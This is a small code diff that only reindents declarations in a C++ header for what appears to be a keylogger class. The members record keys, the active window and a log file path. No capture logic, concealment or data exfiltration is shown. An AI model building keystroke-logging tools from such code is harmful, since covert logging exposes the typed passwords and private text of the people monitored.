@@ -16,15 +16,15 @@ namespace Keyboard
 			void clearLogFile();
 			void addKey(PWCHAR key);
 			const std::string& getLogFilePath();
-            void setKeylog(const std::string& file);
+			void setKeylog(const std::string& file);
 
 		private:
 			std::string logFilePath;
-            std::wfstream logFile;
+			std::wfstream logFile;
 			unsigned int bufferedChar;
 			std::wstring currentWindow;
 			std::wstring currentWindowIndex;
-            std::map<std::wstring, std::wstring> logBuffer;
+			std::map<std::wstring, std::wstring> logBuffer;
 
 			HINSTANCE kbdLibrary;
 			int nChar;
